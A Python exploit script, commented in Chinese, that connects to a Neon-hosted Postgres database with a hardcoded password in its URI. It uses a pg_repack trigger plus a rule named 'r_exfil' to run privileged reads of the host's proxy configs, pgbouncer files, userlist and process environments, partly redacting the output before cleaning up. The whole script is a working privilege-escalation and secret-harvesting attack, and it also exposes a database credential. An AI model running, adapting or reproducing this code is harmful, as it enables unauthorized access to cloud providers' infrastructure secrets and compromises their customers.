# -*- coding: utf-8 -*-
"""v5:local_proxy/pgbouncer 配置读取 + compute_ctl/local_proxy environ + cmdline 补全
脱敏:JWK/私钥/密码只显字段名不显材料"""
import psycopg, re

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text, b bytea)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule_text(expr):
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def set_rule_bytes(expr):
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(b) SELECT %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

def get_text():
    rows = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    return [r[0] for r in rows] if rows else None

def get_bytes():
    rows = q("SELECT b FROM k_out WHERE b IS NOT NULL LIMIT 1")
    return bytes(rows[0][0]) if rows else None

def redact(s, keep=2500):
    """JWK/私钥/密码等材料掩蔽,只保留结构"""
    s2 = s
    # JWK 密钥材料
    s2 = re.sub(r'("(?:d|dp|dq|p|q|qi|k|n|e)":"[^"]+")', lambda m: m.group(1)[:12] + '...REDACTED', s2)
    # PEM 私钥块
    s2 = re.sub(r'-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----', '[PRIVATE KEY REDACTED]', s2, flags=re.S)
    # password 等
    s2 = re.sub(r'(?i)(password|secret|token|api[_-]?key)["\']?\s*[:=]\s*["\']?[^\s,}"\']+', r'\1=***', s2)
    return s2[:keep]

print('=== [1] /etc/local_proxy 目录 ===')
set_rule_text("pg_ls_dir('/etc/local_proxy')")
fire()
print('  ', get_text())

print('=== [2] local_proxy config.json ===')
set_rule_text("pg_read_file('/etc/local_proxy/config.json')")
fire()
t = get_text()
print(redact(t[0]) if t else '  no rows')

print('=== [3] local_proxy static.json ===')
set_rule_text("pg_read_file('/etc/local_proxy/static.json')")
fire()
t = get_text()
print(redact(t[0]) if t else '  no rows')

print('=== [4] local_proxy live.json ===')
set_rule_text("pg_read_file('/etc/local_proxy/live.json')")
fire()
t = get_text()
print(redact(t[0]) if t else '  no rows')

print('=== [5] /etc/pgbouncer.ini ===')
set_rule_text("pg_read_file('/etc/pgbouncer.ini')")
fire()
t = get_text()
print(redact(t[0], 2000) if t else '  no rows')

print('=== [6] pgbouncer userlist ===')
set_rule_text("pg_read_file('/etc/userlist.txt')")
fire()
t = get_text()
print(redact(t[0]) if t else '  no rows(可能不存在)')

print('=== [7] compute_ctl(359) environ ===')
set_rule_bytes("pg_read_binary_file('/proc/359/environ')")
fire()
b = get_bytes()
if b and any(b):
    parts = b.split(b'\x00')
    print('  vars:', [p.decode('utf-8','replace') for p in parts if b'=' in p][:30])
elif b:
    print('  empty environ (%d bytes)' % len(b))
else:
    print('  unreadable')

print('=== [8] cmdline 补全 pid 358 + local_proxy 331 environ ===')
set_rule_bytes("pg_read_binary_file('/proc/358/cmdline')")
fire()
b = get_bytes()
if b:
    print('  358:', redact(b.replace(b'\x00', b' ').decode('utf-8','replace'), 800))
set_rule_bytes("pg_read_binary_file('/proc/331/environ')")
fire()
b = get_bytes()
if b and any(b):
    parts = b.split(b'\x00')
    print('  331 env vars:', [p.decode('utf-8','replace').split('=',1)[0] for p in parts if b'=' in p][:30])
elif b:
    print('  331: empty environ')

print('=== [9] /neonvm/config + /etc 其他配置目录 ===')
set_rule_text("pg_ls_dir('/neonvm/config')")
fire()
print('  /neonvm/config:', get_text())
set_rule_text("pg_ls_dir('/etc')")
fire()
print('  /etc:', get_text())

# 清理
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
